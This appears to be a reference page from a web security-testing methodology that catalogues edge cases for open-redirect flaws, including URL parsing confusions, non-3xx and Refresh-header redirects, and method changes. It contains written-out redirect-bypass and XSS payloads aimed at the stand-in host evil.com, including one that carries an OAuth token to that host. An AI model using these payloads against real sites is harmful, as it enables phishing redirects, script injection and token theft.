# Edge cases — the unusual open-redirect surfaces

## The `Location` header is set but the status isn't 3xx

```text
a 200 with a Location: header — a non-standard but real redirect some
clients follow; a 201/204 with Location (a REST-API 'created-at' header)
the `Location` on a non-3xx isn't a NAV redirect — record the status;
the open-redirect oracle needs a 3xx OR a client-side carrier
```

## The relative-vs-absolute confusion

```text
Location: /dashboard        <- a relative — same-origin, not open
Location: evil.com          <- a RELATIVE path on target.com -> target.com/evil.com
Location: //evil.com        <- scheme-relative — CROSS-origin, the gap
Location: \\\evil.com       <- UNC-style — cross-origin on some parsers
```

A `Location: evil.com` (no scheme, no `//`) resolves RELATIVE to the
current URL → `target.com/evil.com` — a relative-path, NOT the gap.
`//evil.com`/`\\evil.com` are the cross-origin forms.

## The port confusion

```text
Location: https://target.com:8080   <- the host is target.com, port 8080
                                       — the port isn't the bypass
Location: https://target.com@evil.com:8080 — host=evil.com, userinfo=target.com
```

## The IDN/punycode host

```text
Location: https://evil.xn--...     <- a punycode host — the IDN form
Location: https://target.com.evil.xn--p1ai  <- an IDN subdomain
```

An IDN/punycode host passes an ASCII check but resolves to the
attacker-controlled IDN — a display-vs-resolve gap.

## The `data:`/`blob:`/`filesystem:` URIs

```text
Location: data:text/html,<script>alert(1)</script>   <- a data: — XSS
Location: blob:https://target.com/<uuid>              <- a blob: ref
Location: filesystem:https://target.com/temporary/x   <- a filesystem: URI
```

`data:`/`javascript:` are the XSS-twin; `blob:`/`filesystem:` are
origin-scoped (not directly cross-origin but a chain-hop).

## The `javascript:` in a `<meta refresh>` — browsers split

```text
<meta content="0;url=javascript:alert(1)">  — Chrome blocks, some allow
window.location = "javascript:alert(1)"      — some browsers allow
```

The `javascript:` scheme in a meta/JS redirect is browser-split — Chrome
blocks `location.href='javascript:...'` in some contexts; a `data:`/`blob:`
may pass. Test the specific carrier+scheme pair.

## The redirect-loop / chain-of-redirects

```text
Location: /redirect2?next=...  <- the param chains through a second
                                  redirect — a multi-hop surface
```

A param that lands on ANOTHER redirect endpoint chains — the final
destination is the oracle; follow the chain with `follow=False` at each hop.

## The protocol-relative + the scheme-force

```text
Location: //evil.com          <- scheme-relative — follows the page's scheme
                               (on https://target.com -> https://evil.com)
Location: http://evil.com     <- a scheme-force — http downgrades
```

## The fragment-carry — the token-in-fragment

```text
Location: https://evil.com#access_token=<the-token>  <- the OAuth implicit
                                                        flow's fragment
                                                        — the fragment is
                                                        NOT sent to the server;
                                                        a browser-JS read leaks it
```

## The redirect that 302s a POST — the method-drop

```text
a 302 on a POST -> the client re-issues a GET (the method drops)
a 307/308 on a POST -> the client re-issues a POST (the method keeps)
```

A 302-on-POST drops the body on the follow — a 307/308 keeps it. For the
redirect-param surface this is surface-detail; for a POST-carried redirect
param it matters.

## The `Refresh:` HTTP header — a non-meta twin

```text
Refresh: 0;url=https://evil.com   <- a Refresh RESPONSE HEADER — a
                                     header-carried redirect without a
                                     Location header
```

## The polyglot URL — one string, two parses

```text
https://evil.com%5c.target.com  — urllib host=evil.com%5c.target.com;
                                  browser host=evil.com. (\→/ boundary)
```

## The edge-record

`edge: <the-shape>: <the-observed>: <the-verdict>` — each unusual surface
+ the measured Location + the verdict.
